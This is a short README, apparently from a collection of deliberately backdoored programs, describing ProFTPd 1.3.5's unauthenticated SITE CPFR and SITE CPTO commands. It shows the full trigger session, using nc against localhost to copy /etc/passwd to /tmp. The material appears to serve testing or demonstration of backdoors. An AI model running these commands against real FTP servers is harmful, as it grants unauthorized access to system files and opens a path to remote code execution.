# ProFTPd 1.3.5

* Type : Forgotten check (Privileged commands available without authentication) + Remote code execution
* Affected version : 1.3.5

## Backdoor

Any unauthenticated user can use the commands `site cpfr` and `site cpto` to do arbitrary file copy within the host filesystem

## Triggering the backdoor

First, we need to start up the FTP server (e.g., with the _backdoored_ variant):

```console
$ ./backdoored/proftpd -n -c $PWD/proftpd.conf
```

In a separate terminal, we can trigger the backdoor:

```console
$ nc localhost 21  # connect to the FTP server
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [::ffff:127.0.0.1]
SITE CPFR /etc/passwd                 
350 File or directory exists, ready for destination name
SITE CPTO /tmp/passwd
250 Copy successful
QUIT
221 Goodbye.
```

Then, we can see the file was correctly copied:
```console
$ ll /tmp/passwd 
-rw-r--r--. 1 root root 1317 May 26 13:37 /tmp/passwd
```